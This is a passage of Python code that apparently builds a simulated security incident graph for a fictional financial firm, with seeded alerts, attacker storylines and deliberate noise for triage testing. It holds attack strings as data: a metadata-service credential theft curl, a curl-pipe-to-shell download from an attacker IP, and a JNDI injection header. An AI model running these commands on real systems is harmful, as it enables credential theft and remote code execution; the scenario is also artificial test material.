    e("STOLEN_BY", sc.CRED_BASTION_KEY, p_curl, {"method": "imds"}, source="derived")
    b.alert(a["a009"][0], "Cloud instance metadata service credential access from interactive shell", a["a009"][2], a["a009"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_BASTION, techniques=["T1552.005"], tactic="Credential Access", hostname=sc.BASTION_NAME, user="svc-finops-sftp", incident=sc.INCIDENT_BASTION, raw={"title": "Cloud instance metadata service credential access from interactive shell", "severity": "Medium", "tactic": "Credential Access", "technique": "T1552.005", "host": "bas-01", "user": "svc-finops-sftp", "command_line": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/LarkspurBastionSSMRole", "detected_at": a["a009"][1]}, involves=[(p_curl, "subject"), (sc.CRED_BASTION_KEY, "credential")])
    e("STOLEN_BY", sc.CRED_BASTION_KEY, a["a009"][0], {"method": "imds"}, source="derived")
    n(sc.CRED_PROD_KEY, "Credential", sc.CRED_PROD_KEY_ID, {"credential_type": "aws_temporary_key", "principal_id": sc.PROD_READER_ROLE, "issued_at": sc.CLOUDEVENTS_A["a012"][1], "expires_at": "2026-09-10T03:24:15Z", "status": "expired", "derived_from": sc.CRED_BASTION_KEY}, source="cloudtrail-sim", first_seen=sc.CLOUDEVENTS_A["a012"][1])
    e("CREDENTIAL_FOR", sc.CRED_PROD_KEY, sc.PROD_READER_ROLE, source="cloudtrail-sim")
    e("DERIVED_FROM", sc.CRED_PROD_KEY, sc.CRED_BASTION_KEY, {"via": "assume_role"}, source="derived")

    ev = sc.CLOUDEVENTS_A
    for key in ("a010", "a011", "a012"):
        eid, t, name, src_, keyid, ok, err, count = ev[key]
        b.cloud_event(eid, t, name, src_, keyid, ok, err, count, principal=sc.BASTION_ROLE, credential=sc.CRED_BASTION_KEY, source_ip=sc.ATTACKER_EGRESS_IP,
                      target=sc.PROD_READER_ROLE if key == "a012" else None, assumed=sc.PROD_READER_ROLE if key == "a012" else None)
    targets = {"a013": sc.CARDHOLDER_VAULT, "a014": sc.CARDHOLDER_VAULT, "a015": sc.DB_READER_SECRET, "a016": sc.HSM_SECRET}
    for key in ("a013", "a014", "a015", "a016"):
        eid, t, name, src_, keyid, ok, err, count = ev[key]
        b.cloud_event(eid, t, name, src_, keyid, ok, err, count, principal=sc.PROD_READER_ROLE, credential=sc.CRED_PROD_KEY, source_ip=sc.ATTACKER_EGRESS_IP,
                      target=targets[key], bytes_=sc.EXFIL_BYTES if key == "a014" else None, account_id="111111111111")
    # routine bastion role activity through the NAT gateway (hub ip; must not correlate anything)
    b.ip(NAT_IP, is_nat=True, asn_org="Larkspur Financial NAT gateway", reputation="benign")
    for i, t in enumerate(("2026-09-09T04:00:00Z", "2026-09-10T04:00:00Z", "2026-09-11T04:00:00Z")):
        b.cloud_event(f"cloudevent:aws:evt-bg{i:03d}", t, "UpdateInstanceInformation", "ssm.amazonaws.com", "ASIA5LARKBASTIONBG0" + str(i), True, None, 288, principal=sc.BASTION_ROLE, credential=sc.CRED_BASTION_KEY if False else _bg_cred(b, i), source_ip=NAT_IP)
    b.alert(a["a017"][0], "API calls for role LarkspurProdDataReader from a new geolocation/ASN", a["a017"][2], a["a017"][1], source_system="cloud-anomaly", alert_type="cloud", anchor=sc.PROD_READER_ROLE, techniques=["T1078.004"], tactic="Initial Access", hostname=None, user="LarkspurProdDataReader/ember-sync", raw={"title": "API calls from new geolocation/ASN", "severity": "Low", "principal": sc.PROD_READER_ROLE_ARN, "source_ip": sc.ATTACKER_EGRESS_IP, "asn": sc.ATTACKER_ASN, "country": "NL"}, involves=[(sc.CRED_PROD_KEY, "credential"), (egress_ip, "source"), (ev["a014"][0], "object"), (ev["a015"][0], "object")])

    # ------------------------------------------------------------------ storyline B
    salt_ip = b.ip(sc.SALTWORKS_IP, asn="AS64501", asn_org="Fictional Bulletproof Hosting", country="RO", reputation="malicious")
    bb = sc.ALERT_B
    p_java = process("2211:1789067000", sc.EP_EDGE, "/usr/bin/java", "java -jar statement-render.jar", "render", "2026-09-08T10:00:00Z")
    p_bash = process("2290:1789075187", sc.EP_EDGE, "/bin/bash", 'bash -c "curl -s http://203.0.113.99:8000/s/brackish.sh | sh"', "render", bb["b002"][1], signed=False)
    f_brackish = file(sc.HASH_BRACKISH, ".b.jsp", "/opt/statement-render/webapps/ROOT/.b.jsp", "BRACKISH", "malicious")
    e("SPAWNED", p_java, p_bash, source="falcon-sim")
    e("EXECUTED", p_bash, f_brackish, {"action": "wrote"}, source="falcon-sim")
    e("CONNECTED_TO", p_bash, salt_ip, {"port": 8000, "protocol": "tcp", "direction": "outbound", "count": 3, "bytes_out": 2048, "first_time": bb["b002"][1], "last_time": "2026-09-10T21:30:00Z"}, source="falcon-sim")
    b.alert(bb["b001"][0], "JNDI injection pattern in request header", bb["b001"][2], bb["b001"][1], source_system="waf", alert_type="network", anchor=sc.EDGE_VM, techniques=["T1190"], tactic="Initial Access", hostname=sc.EDGE_NAME, extra={"source_ip": sc.SALTWORKS_IP, "signature": "jndi-ldap-header"}, raw={"rule": "JNDI-LDAP-HEADER", "severity": "Medium", "src": sc.SALTWORKS_IP, "dst": f"{sc.EDGE_PUBLIC_IP}:8080", "header": "X-Api-Version: ${jndi:ldap://203.0.113.99:1389/o}"}, involves=[(salt_ip, "source")])
    b.alert(bb["b002"][0], "Shell spawned by Java application server process", bb["b002"][2], bb["b002"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_EDGE, techniques=["T1190", "T1059.004"], tactic="Execution", hostname=sc.EDGE_NAME, user="render", incident=sc.INCIDENT_EDGE, involves=[(p_java, "subject"), (p_bash, "subject"), (salt_ip, "destination")])
    b.alert(bb["b003"][0], "Web shell-like file written to web root", bb["b003"][2], bb["b003"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_EDGE, techniques=["T1505.003"], tactic="Persistence", hostname=sc.EDGE_NAME, user="render", incident=sc.INCIDENT_EDGE, involves=[(p_bash, "subject"), (f_brackish, "object")])

    # ------------------------------------------------------------------ named noise
    nn = sc.ALERT_N
    file("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "eicar.com", "/home/ci/eicar.com", "EICAR-Test-File", "malicious")
    b.alert(nn["n001"][0], "EICAR test file detected and quarantined", nn["n001"][2], nn["n001"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_DEV_SANDBOX, techniques=["T1204.002"], tactic="Execution", hostname=sc.DEV_SANDBOX_NAME, user="ci", extra={"action_taken": "quarantined"}, involves=[(FILE_EICAR, "object")])
    b.alert(nn["n002"][0], "S3 bucket allows public read", nn["n002"][2], nn["n002"][1], source_system="cspm", alert_type="issue", anchor=sc.MARKETING_BUCKET, hostname="larkspur-marketing-assets", raw={"rule": "S3_BUCKET_PUBLIC_READ", "severity": "Critical", "resource": "larkspur-marketing-assets", "account": "666666666666"})
    mreyes_ip = b.ip(MREYES_IP)
    e("LOGGED_ON", sc.USER_MREYES, sc.EP_FILESHARE, {"logon_type": "network", "logon_time": "2026-09-11T01:11:30Z", "source_ip": MREYES_IP, "session_id": "net-88"}, source="falcon-sim", first_seen="2026-09-11T01:11:30Z", last_seen="2026-09-11T01:11:30Z")
    b.alert(nn["n003"][0], "PsExec service execution", nn["n003"][2], nn["n003"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_FILESHARE, techniques=["T1569.002"], tactic="Execution", hostname=sc.FILESHARE_NAME, user="mreyes", change_ticket=sc.CHANGE_TICKET, extra={"source_ip": MREYES_IP}, involves=[(sc.USER_MREYES, "subject"), (mreyes_ip, "source")])
    vpn_ip = b.ip(sc.VPN_EGRESS_IP, asn="AS64496", asn_org="Larkspur Financial corporate VPN egress", country="US", reputation="benign", is_vpn=True)
    london_ip = b.ip(LONDON_IP, asn="AS64502", asn_org="Fictional UK Broadband", country="GB", reputation="benign")
    b.alert(nn["n004"][0], "Impossible travel: London then New York within 46 minutes", nn["n004"][2], nn["n004"][1], source_system="okta", alert_type="identity", anchor=sc.USER_PKAUR, techniques=["T1078"], tactic="Initial Access", hostname=None, user="pkaur", extra={"mfa_satisfied": True}, raw={"rule": "impossible_travel", "severity": "Medium", "user": "pkaur", "first_login": {"city": "London", "ip": LONDON_IP, "time": "2026-09-11T07:02:00Z"}, "second_login": {"city": "New York", "ip": sc.VPN_EGRESS_IP, "time": "2026-09-11T07:48:00Z"}, "mfa": "satisfied"}, involves=[(london_ip, "source"), (vpn_ip, "source")])
    for i, aid in enumerate(sc.QUARANTINE_ALERT_IDS):
        t = f"2026-09-{10 + (i % 2):02d}T{8 + (i % 9):02d}:{(i * 7) % 60:02d}:00Z"
        b.alert(aid, "Quarantined malicious attachment (blocked pre-execution)", "low", t, source_system="falcon", alert_type="detection", anchor=QUARANTINE_EPS[i], techniques=["T1566.001"], tactic="Initial Access", user=QUARANTINE_USERS[i].rsplit(":", 1)[-1], extra={"action_taken": "quarantined", "blocked": True})
    scanner_ip = b.ip(sc.SCANNER_IP)
    ids_targets = [APP_VMS[0], APP_VMS[1], APP_VMS[2], sc.BASTION_VM, sc.EDGE_VM, sc.STG_EDGE_VM, sc.FILESHARE_VM, NOSENSOR_VMS[0], NOSENSOR_VMS[1], VPN_GW_VM]
    for i, target in enumerate(ids_targets):
        t = f"2026-09-10T{9 + i // 2:02d}:{(i * 11) % 60:02d}:00Z"
        b.alert(f"alert:ids:ids-n1{i + 1:02d}", "Exploit attempt signature: HTTP request smuggling probe", "low" if i % 3 else "medium", t, source_system="ids", alert_type="network", anchor=target, techniques=["T1595.002"], tactic="Reconnaissance", extra={"source_ip": sc.SCANNER_IP, "signature": f"ET SCAN probe {i + 1}"}, involves=[(scanner_ip, "source")])
    for addr in NOISE_EXT_IPS:
        b.ip(addr, asn="AS64510", asn_org="Fictional cloud hosting", country="US")
    for i in range(5):
        t = f"2026-09-{9 + i % 3:02d}T{10 + i:02d}:05:00Z"
        target = WALLET_ALB if i < 3 else APP_VMS[i % 3]
        b.alert(f"alert:waf:waf-n2{i + 1:02d}", "Generic exploit pattern in request (path traversal probe)", "low" if i % 2 else "medium", t, source_system="waf", alert_type="network", anchor=target, techniques=["T1190"], tactic="Initial Access", extra={"source_ip": NOISE_EXT_IPS[i % 2], "signature": "generic-traversal"}, involves=[(IP.format(NOISE_EXT_IPS[i % 2]), "source")])

    # ------------------------------------------------------------------ background alerts with real (but modest) context
    b.alert("alert:falcon:ldt-g001", "Potentially unwanted program (browser toolbar)", "low", "2026-09-11T10:15:00Z", source_system="falcon", alert_type="detection", anchor=QUARANTINE_EPS[3], techniques=["T1204.002"], tactic="Execution", user=QUARANTINE_USERS[3].rsplit(":", 1)[-1])
    b.alert("alert:falcon:ldt-g002", "Suspicious PowerShell in IT maintenance script", "medium", "2026-09-11T00:30:00Z", source_system="falcon", alert_type="detection", anchor=sc.EP_MREYES, techniques=["T1059.001"], tactic="Execution", hostname=sc.EP_MREYES_HOSTNAME, user="mreyes")
    b.alert("alert:falcon:ldt-g003", "Commodity infostealer executed from downloads folder", "high", "2026-09-11T11:20:00Z", source_system="falcon", alert_type="detection", anchor=QUARANTINE_EPS[7], techniques=["T1204.002", "T1555.003"], tactic="Execution", user=QUARANTINE_USERS[7].rsplit(":", 1)[-1])
    b.alert("alert:falcon:ldt-g004", "Encoded PowerShell launched from Office macro", "medium", "2026-09-11T12:05:00Z", source_system="falcon", alert_type="detection", anchor=EP_JOKAFOR, techniques=["T1059.001", "T1204.002"], tactic="Execution", hostname="WKS-4410", user="jokafor")
    old_ip = b.ip(OLD_IOC_IP, asn="AS64520", asn_org="Fictional hosting", country="DE")
    p_wiki_curl = process("3300:1789200000", EP_WIKI, "/usr/bin/curl", f"curl http://{OLD_IOC_IP}/health", "www-data", "2026-09-11T05:00:00Z")
    e("CONNECTED_TO", p_wiki_curl, old_ip, {"port": 80, "protocol": "tcp", "direction": "outbound", "count": 1, "bytes_out": 200, "first_time": "2026-09-11T05:00:00Z", "last_time": "2026-09-11T05:00:00Z"}, source="falcon-sim")
    b.alert("alert:falcon:ldt-g005", "Outbound connection to low-reputation infrastructure", "low", "2026-09-11T05:01:00Z", source_system="falcon", alert_type="detection", anchor=EP_WIKI, techniques=["T1071.001"], tactic="Command and Control", hostname="wiki-confluence-01", involves=[(p_wiki_curl, "subject"), (old_ip, "destination")])
    b.alert("alert:cspm:iss-g001", "IAM role with wildcard administrative policy", "medium", "2026-09-11T06:05:00Z", source_system="cspm", alert_type="issue", anchor=sc.CORP_IT_ADMIN_ROLE, hostname="LarkspurCorpItAdmin")
    b.alert("alert:cspm:iss-g002", "Unencrypted EBS volume attached to instance", "low", "2026-09-11T06:10:00Z", source_system="cspm", alert_type="issue", anchor=APP_VMS[2], hostname="wallet-api-03")
    b.alert("alert:cspm:iss-g003", "Security group allows SSH from 0.0.0.0/0", "medium", "2026-09-11T06:15:00Z", source_system="cspm", alert_type="issue", anchor=sc.DEV_LOG4J_VM, hostname=sc.DEV_LOG4J_NAME)
    b.alert("alert:cspm:iss-g004", "Internet-exposed production instance with critical vulnerability and administrative role", "high", "2026-09-11T06:20:00Z", source_system="cspm", alert_type="issue", anchor=CANARY_VM, hostname="payments-api-canary", involves=[("cve:CVE-2022-22965", "object")])

    return ContextGraph.from_records(list(b.nodes.values()), b.edges)


def _bg_cred(b: _Builder, i: int) -> str:
    cid = f"credential:aws:ASIA5LARKBASTIONBG0{i}"
    b.n(cid, "Credential", f"ASIA5LARKBASTIONBG0{i}", {"credential_type": "aws_temporary_key", "principal_id": sc.BASTION_ROLE, "issued_at": f"2026-09-{9 + i:02d}T03:00:00Z", "expires_at": f"2026-09-{9 + i:02d}T09:00:00Z", "status": "expired", "derived_from": None}, source="cloudtrail-sim")
    if not any(ed["type"] == "CREDENTIAL_FOR" and ed["src"] == cid for ed in b.edges):
        b.e("CREDENTIAL_FOR", cid, sc.BASTION_ROLE, source="cloudtrail-sim")
    return cid
